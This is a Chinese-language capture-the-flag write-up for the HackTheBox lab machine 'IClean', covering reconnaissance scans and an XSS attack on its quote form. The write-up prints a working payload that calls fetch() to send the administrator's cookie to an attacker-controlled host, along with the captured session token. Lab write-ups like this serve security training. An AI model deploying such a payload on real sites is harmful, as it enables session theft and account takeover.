# \[level:Medium] IClean

## 一 、信息收集

| 靶机信息 |                       |
| ---- | --------------------- |
| IP   | 10.129.99.246         |
| 域名   | http://capiclean.htb/ |

### 1.1 nmap扫描结果

```
┌──(a1ertx5s㉿kali)-[~]
└─$ nmap -Pn 10.129.99.246
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-10 22:50 CST
Nmap scan report for capiclean.htb (10.129.99.246)
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 122.72 seconds
```

### 1.2 url目录扫描结果

```
┌──(a1ertx5s㉿kali)-[~]
└─$ dirsearch -u http://capiclean.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/a1ertx5s/reports/http_capiclean.htb/__24-04-10_23-08-03.txt

Target: http://capiclean.htb/

[23:08:03] Starting: 
[23:09:40] 200 -    5KB - /about
[23:12:01] 302 -  189B  - /dashboard  ->  /
[23:13:22] 200 -    2KB - /login
[23:13:25] 302 -  189B  - /logout  ->  /
[23:14:45] 403 -  278B  - /server-status
[23:14:46] 403 -  278B  - /server-status/
[23:14:46] 200 -    8KB - /services

Task Completed
```

扫描结果没啥用, 就一个dashboard值得关注.

### 二、渗透过程

### 2.1 XSS获取管理员cookie

随便逛逛可以发现有一个quote页面,页面可以给管理员留言,尝试是否存在xss,能否利用xss获取管理员cookie.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>burp suite 抓包</p></figcaption></figure>

其中exp是url encode过的.

```html
<img src=x onerror=fetch("http://hackIP:Port/?cookie="+document.cookie);>
```

可以使用python3的http server进行cookie的捕获,结果如下

```
┌──(a1ertx5s㉿kali)-[~]
└─$ python3 -m http.server 959
Serving HTTP on 0.0.0.0 port 959 (http://0.0.0.0:959/) ...
10.129.99.246 - - [10/Apr/2024 23:21:57] "GET /?cookie=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZhaHiw.vNyGcFEurcPrFcHAjqEJsNVRkFo HTTP/1.1" 200 -
```

成功获取cookie, 将cookie加入到header中,再去访问dashboard.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

成功进入到dashboard页面.

